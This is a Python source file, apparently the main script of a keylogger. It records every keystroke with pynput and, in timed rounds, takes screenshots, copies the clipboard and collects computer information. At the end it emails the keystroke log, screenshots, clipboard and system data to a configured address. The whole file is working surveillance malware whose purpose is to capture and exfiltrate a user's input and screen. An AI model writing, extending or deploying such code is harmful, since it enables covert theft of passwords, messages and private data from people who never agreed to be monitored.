import time
import threading

from datetime import datetime
from pynput.keyboard import Listener, Key
from modules.functions import computer_information, copy_clipboard, screenshot, write_file
from modules.constants import log_path, output, email_address, printing, sys_info, screenshot_file, clipboard
from modules.email import send_email

if __name__ == '__main__':
    number_of_iterations = 0
    currentTime = time.time()
    time_iteration = 15
    stoppingTime = time.time() + time_iteration
    number_of_iterations_end = 3

    counter = 0
    keys = []

    while number_of_iterations < number_of_iterations_end:
        def press(key):
            global counter, keys, currentTime

            print(key)
            keys.append(str(key))
            counter += 1
            currentTime = time.time()

            if counter >= 1:
                counter = 0
                write_file(keys)
                keys = []

        def on_release(key):
            if key == Key.esc:
                return False
            if currentTime > stoppingTime:
                return False

        with Listener(on_press=press, on_release=on_release) as listener:
            listener.join()

        if currentTime > stoppingTime:

            screenshot(number_of_iterations)

            copy_clipboard()
            computer_information()

            number_of_iterations += 1

            currentTime = time.time()
            stoppingTime = time.time() + time_iteration

    send_email([(output, log_path + output),
                (sys_info, log_path + sys_info),
                ('0' + screenshot_file, log_path + '0' + screenshot_file),
                ('1' + screenshot_file, log_path + '1' + screenshot_file),
                ('2' + screenshot_file, log_path + '2' + screenshot_file),
                (clipboard, log_path + clipboard)],
               email_address)